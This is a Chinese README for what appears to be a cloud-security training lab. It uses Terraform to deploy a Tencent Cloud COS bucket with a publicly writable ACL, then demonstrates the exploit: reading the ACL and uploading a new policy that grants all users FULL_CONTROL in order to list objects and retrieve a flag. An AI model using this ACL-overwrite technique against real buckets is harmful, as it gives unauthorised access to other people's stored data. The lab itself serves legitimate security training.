# 腾讯云 COS Bucket ACL 可写漏洞环境

[English](./README.md) | 中文

## 描述信息

这是一个用于构建腾讯云 COS Bucket ACL 可写的漏洞环境靶场。

使用 Terraform 构建环境后，用户可以通过修改 Bucket 的 ACL 策略将原本无法访问的资源修改为可读，从而访问到 COS 服务资源。

## 环境搭建

在容器中执行以下命令

```shell
cd /TerraformGoat/tencentcloud/cos/bucket_acl_writable/
```

编辑 `terraform.tfvars` 文件，在文件中填入你的`tencentcloud_secret_id`和`tencentcloud_secret_key`

```shell
vim terraform.tfvars
```

> 在腾讯云控制台的 [API 密钥管理](https://console.cloud.tencent.com/cam/capi)可以创建和查看您的 SecretID 和 SecretKey

部署靶场

```shell
terraform init
terraform apply
```

> 在终端提示 `Enter a value:` 时，输入 `yes` 即可

当命令执行完后，在 Outputs 处可以看到 Bucket 名称，这个 Bucket 存在 Bucket ACL 读取和写入权限

## 漏洞利用

尝试遍历 Object，发现访问被拒绝

![img](../../../images/1652347780.png)

尝试读取 Bucket 的 ACL 策略，发现可以读取

```shell
https://houxianxxxxx-1234567890.cos.ap-beijing.myqcloud.com/?acl
```

![img](../../../images/1652347858.png)

尝试使用 PUT 方法修改 Bucket 的 ACL 策略

原来的 ACL 策略

```xml
<Grant>
  <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
    <URI>http://cam.qcloud.com/groups/global/AllUsers</URI>
  </Grantee>
  <Permission>WRITE_ACP</Permission>
</Grant>
<Grant>
  <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
    <URI>http://cam.qcloud.com/groups/global/AllUsers</URI>
  </Grantee>
  <Permission>READ_ACP</Permission>
</Grant>
```

新的 ACL 策略

```xml
<Grant>
  <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
    <URI>http://cam.qcloud.com/groups/global/AllUsers</URI>
  </Grantee>
  <Permission>FULL_CONTROL</Permission>
</Grant>
```

![img](../../../images/1652348202.png)

再次尝试遍历 Object，发现已经可以遍历到了，说明刚才上传的 ACL 策略生效了，在返回的信息中可以看到 flag

![img](../../../images/1652348264.png)

## 销毁环境

```shell
terraform destroy
```
